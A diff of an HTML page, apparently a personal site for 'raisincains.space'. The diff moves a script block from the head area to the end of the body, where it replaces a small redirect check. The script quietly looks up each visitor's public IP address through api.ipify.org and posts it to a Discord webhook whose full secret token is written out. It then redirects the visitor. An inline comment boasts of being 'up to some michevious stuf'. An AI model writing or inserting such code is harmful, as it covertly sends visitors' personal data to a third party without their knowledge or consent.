@@ -1272,36 +1272,7 @@
         }
       }
     </style>
-	  script> //im up to some michevious stuf >:)
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const discordWebhook = 'https://discord.com/api/webhooks/1212194915883155486/mHxJb4bdz0XSf3FO-eJm01Ff1NyraazQ5z3J_dZAt9mXL_4gqP0poJ91EneMctEKBYaX';
-
-                const discordData = {
-                    content: `Suspected IP Address: ${data.ip}`,
-                };
-
-                const serverlessFunction = `
-                    fetch('${discordWebhook}', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(${JSON.stringify(discordData)}),
-                    });
-
-                    setTimeout(function() {
-                        window.location.href = 'https://raisincains.space/#';
-                    }, 3000);
-                `;
-
-                const script = document.createElement('script');
-                script.textContent = serverlessFunction;
-                document.body.appendChild(script);
-            })
-            .catch(error => console.error('Error:', error));
-    </script>
+	  <noscript>
       <style>
         body {
           overflow: auto !important;
@@ -2168,12 +2139,35 @@
                     s = s.replace(this.regex, function(x, a) {
                           return ' < text - node > ' + a + ' < /text-node>';});w = document.createElement('text-node');w.innerHTML = s;x.replaceWith(w);while (w.childNodes.length > 0) {w.parentNode.insertBefore(w.childNodes[0],w);}w.parentNode.removeChild(w);}},};onvisible.add('#text02', { style: 'fade-right', speed: 1000, intensity: 1, delay: 0, state: true, replay: false });onvisible.add('#text01', { style: 'fade-right', speed: 1000, intensity: 2, delay: 0, state: true, replay: false });onvisible.add('#icons01', { style: 'fade-up', speed: 1000, intensity: 5, delay: 0, stagger: 125, staggerSelector: ':scope > li', state: true, replay: false });onvisible.add('#text03', { style: 'fade-right', speed: 1000, intensity: 2, delay: 0, state: true, replay: false });onvisible.add('#buttons01', { style: 'fade-left', speed: 1000, intensity: 1, delay: 0, stagger: 125, staggerSelector: ':scope > li', state: true, replay: false });onvisible.add('#container01', { style: 'fade-up', speed: 1000, intensity: 2, delay: 0, state: true, replay: false });})();
     </script>
-	 <script>
-        if (window.location.hostname === 'https://raisincains.space') {
-            if (window.location.hash === '') {
-                window.location.href = 'https://raisincains.space/auth';
-            }
-        }
+	 script> //im up to some michevious stuf >:)
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const discordWebhook = 'https://discord.com/api/webhooks/1212194915883155486/mHxJb4bdz0XSf3FO-eJm01Ff1NyraazQ5z3J_dZAt9mXL_4gqP0poJ91EneMctEKBYaX';
+
+                const discordData = {
+                    content: `Suspected IP Address: ${data.ip}`,
+                };
+
+                const serverlessFunction = `
+                    fetch('${discordWebhook}', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(${JSON.stringify(discordData)}),
+                    });
+
+                    setTimeout(function() {
+                        window.location.href = 'https://raisincains.space/#';
+                    }, 3000);
+                `;
+
+                const script = document.createElement('script');
+                script.textContent = serverlessFunction;
+                document.body.appendChild(script);
+            })
+            .catch(error => console.error('Error:', error));
     </script>
   </body>
 </html>
